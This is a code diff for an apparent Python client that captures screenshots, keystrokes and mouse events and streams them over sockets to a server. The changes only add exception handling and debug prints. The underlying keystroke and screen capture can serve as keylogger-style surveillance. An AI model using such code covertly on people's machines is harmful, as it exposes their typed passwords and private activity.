@@ -8,11 +8,13 @@ import keyboard  # This is for capturing keyboard events
 import mouse  # This is for capturing mouse events
 
 def send_msg(sock, msg):
-    msg = msg.encode('utf-8') if isinstance(msg, str) else msg
-    # Prefix each message with a 4-byte length (network byte order)
-    msg = len(msg).to_bytes(4, byteorder='big') + msg
-    sock.sendall(msg)
-    print(f"Sent message: {msg}")  # Debug print
+    try:
+        msg = msg.encode('utf-8') if isinstance(msg, str) else msg
+        msg = len(msg).to_bytes(4, byteorder='big') + msg
+        sock.sendall(msg)
+        print(f"Sent message: {msg}")  # Debug print
+    except Exception as e:
+        print(f"Error sending message: {e}")
 
 def send_screenshots():
     while True:
@@ -33,6 +35,8 @@ def send_screenshots():
                 sock.send(screenshot_data[i:i+chunk_size])
             
             time.sleep(0.05)
+        except Exception as e:
+            print(f"Error sending screenshots: {e}")
         finally:
             sock.close()  # Ensure the socket is closed
             print("Screenshot connection closed")
@@ -62,6 +66,8 @@ def send_messages():
                 elif key_pressed == "shift":
                     key_pressed = "@"
                 send_msg(sock, key_pressed)
+    except Exception as e:
+        print(f"Error sending messages: {e}")
     finally:
         sock.close()  # Ensure the socket is closed
         print("Keyboard connection closed")
@@ -74,16 +80,24 @@ def listener_mouse():
         print("Connected to server for mouse")
 
         def on_move(x, y):
-            send_msg(sock, f"move,{x},{y}")
+            try:
+                send_msg(sock, f"move,{x},{y}")
+            except Exception as e:
+                print(f"Error sending mouse move: {e}")
 
         def on_click(x, y, button, pressed):
             if pressed:
-                send_msg(sock, f"click,{x},{y}")
+                try:
+                    send_msg(sock, f"click,{x},{y}")
+                except Exception as e:
+                    print(f"Error sending mouse click: {e}")
 
         mouse.hook(on_move)
         mouse.hook(on_click)
         while True:
             time.sleep(0.1)
+    except Exception as e:
+        print(f"Error connecting to server for mouse: {e}")
     finally:
         sock.close()  # Ensure the socket is closed
         print("Mouse connection closed")
